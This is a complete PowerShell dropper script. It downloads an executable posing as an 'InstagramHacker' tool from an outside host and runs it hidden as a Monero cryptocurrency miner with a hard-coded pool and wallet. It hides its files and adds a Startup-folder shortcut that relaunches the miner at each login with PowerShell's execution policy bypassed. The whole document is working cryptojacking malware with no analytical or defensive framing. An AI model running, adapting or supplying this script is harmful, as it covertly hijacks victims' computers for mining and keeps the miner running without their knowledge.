
Write-Host "Defining variables..."
$FileUrl = "https://insta-drab-seven.vercel.app/api/download"  
$DownloadPath = "$env:APPDATA\InstagramHacker.exe"
$ExeArguments = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=70 --cuda --opencl"


Write-Host "Downloading EXE file..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $FileUrl -OutFile $DownloadPath -ErrorAction Stop
    Write-Host "EXE file downloaded successfully."
} catch {
    Write-Host "Failed to download EXE file: $_"
    exit
}

$SecondaryScriptPath = "$env:APPDATA\CheckAndRun.ps1"
$SecondaryScriptContent = @"
# Check if the file exists
if (Test-Path -Path `"$DownloadPath`") {
    # Execute the file with the specified arguments
    Start-Process -FilePath `"$DownloadPath`" -ArgumentList `"$ExeArguments`" -WindowStyle Hidden
}
"@


try {
    $SecondaryScriptContent | Out-File -FilePath $SecondaryScriptPath -Encoding ASCII -ErrorAction Stop
    Write-Host "Secondary script created successfully."
} catch {
    Write-Host "Failed to create secondary script: $_"
    exit
}

try {
    Set-ItemProperty -Path $SecondaryScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
    Write-Host "Secondary script hidden successfully."
} catch {
    Write-Host "Failed to hide secondary script: $_"
}

Write-Host "Executing EXE file..."
try {
    Start-Process -FilePath $DownloadPath -ArgumentList $ExeArguments -WindowStyle Hidden -ErrorAction Stop
    Write-Host "EXE file executed successfully."
} catch {
    Write-Host "Failed to execute EXE file: $_"
}


Write-Host "Hiding the downloaded file..."
try {
    Set-ItemProperty -Path $DownloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
    Write-Host "File hidden successfully."
} catch {
    Write-Host "Failed to hide file: $_"
}


Write-Host "Adding secondary script to startup for current user..."
try {
 
    $StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    $ShortcutPath = "$StartupFolder\CheckAndRun.lnk"

   
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SecondaryScriptPath`""
    $Shortcut.Save()

    Write-Host "Startup shortcut created successfully in Startup folder."
} catch {
    Write-Host "Failed to create startup shortcut: $_"
}

Write-Host "Verifying the startup entry..."
try {
    if (Test-Path -Path $ShortcutPath) {
        Write-Host "Startup entry verified successfully."
    } else {
        Write-Host "Startup entry verification failed: Shortcut not found."
    }
} catch {
    Write-Host "Failed to verify startup entry: $_"
}
